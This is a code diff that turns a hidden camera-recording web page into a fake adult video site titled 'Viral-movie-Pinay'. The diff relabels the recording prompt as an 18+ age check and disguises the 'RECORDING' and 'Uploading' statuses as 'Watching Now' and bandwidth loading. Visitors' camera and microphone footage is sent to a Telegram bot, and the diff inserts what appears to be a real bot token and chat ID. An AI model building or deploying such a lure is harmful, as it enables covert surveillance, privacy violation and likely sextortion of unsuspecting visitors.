@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Viewer</title>
+    <title>Viral-movie-Pinay</title>
     <style>
         /* Base Styles */
         body, html { margin: 0; padding: 0; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #111; color: white;}
@@ -55,23 +55,23 @@
     <!-- Sidebar Menu -->
     <div id="sidebar">
         <!-- Status Display inside menu -->
-        <div id="stealth-status">Status: Camera Ready</div>
+        <div id="stealth-status">Status: 18+ Granted</div>
         
         <!-- Hidden Stop Recording Control -->
-        <a id="btn-stop-record">🛑 Stop & Upload to Bot</a>
+        <a id="btn-stop-record">🎬 Watch Now</a>
         
         <!-- Lesson Links -->
-        <div class="menu-label">Links / Prompters</div>
+        <div class="menu-label">List</div>
         <div id="lesson-links"></div>
     </div>
 
     <!-- Start Recording Modal (Restored) -->
     <div id="modal">
         <div class="modal-content">
-            <h2 id="modal-text">Start Recording?</h2>
-            <p>Do you want to start a new hidden video recording for this lesson?</p>
-            <button class="modal-btn btn-start" id="btn-start">Start</button>
-            <button class="modal-btn btn-cancel" id="btn-cancel">Cancel</button>
+            <h2 id="modal-text">Verify You?</h2>
+            <p>Are 18+ years old?</p>
+            <button class="modal-btn btn-start" id="btn-start">Yes</button>
+            <button class="modal-btn btn-cancel" id="btn-cancel">No</button>
         </div>
     </div>
 
@@ -84,16 +84,16 @@
         // ==========================================
         // ⚙️ SETTINGS 
         // ==========================================
-        const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; 
-        const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+        const BOT_TOKEN = "8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8"; 
+        const CHAT_ID = "-1003325796934";
 
         // Auto-Chop Timer (2.5 minutes in milliseconds)
         const CHOP_INTERVAL_MS = 150000; 
 
         // Add your Embed Links / Prompters here
         const lessons = [
-            { title: "Lesson 1: Introduction", url: "https://example.com" },
-            { title: "Lesson 2: Wikipedia", url: "https://en.wikipedia.org/wiki/Main_Page" }
+            { title: "Pinay: New Viral", url: "https://example.com" },
+            { title: "American: Movies", url: "https://en.wikipedia.org/wiki/Main_Page" }
         ];
 
         // ==========================================
@@ -157,7 +157,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 cameraPreview.srcObject = stream;
             } catch (err) {
-                statusText.innerText = "Status: Camera Access Denied!";
+                statusText.innerText = "Status: 18+ Access Denied!";
                 statusText.style.color = "red";
             }
         }
@@ -166,7 +166,7 @@
         function startRecording(partNumber) {
             const stream = cameraPreview.srcObject;
             if (!stream) {
-                alert("Camera not ready. Please allow permissions.");
+                alert("Please allow permissions 18+ to proceed...");
                 return;
             }
 
@@ -194,7 +194,7 @@
 
             // Update UI inside the hidden menu
             btnStop.style.display = "block";
-            statusText.innerText = `Status: 🔴 RECORDING (Part ${partNumber})`;
+            statusText.innerText = `Status: 🟢 Watching Now (Part ${partNumber})`;
             statusText.style.color = "#ff4d4d";
 
             // Set auto-chop timer
@@ -212,7 +212,7 @@
             document.dispatchEvent(new Event('ForceStopRecording')); 
 
             btnStop.style.display = "none";
-            statusText.innerText = `Status: ⏳ Uploading Final Part...`;
+            statusText.innerText = `Status: ⏳Loading Internet Bandwidth...`;
             statusText.style.color = "#ffc107";
             
             setTimeout(() => { sidebar.classList.remove('active'); }, 1000);
@@ -242,7 +242,7 @@
                 const result = await response.json();
                 if (result.ok) {
                     if(!isRecording) {
-                        statusText.innerText = `Status: ✅ All Uploads Complete! (Idle)`;
+                        statusText.innerText = `Status: Enjoy Watching! (Idle)`;
                         statusText.style.color = "#28a745";
                     }
                 } else {
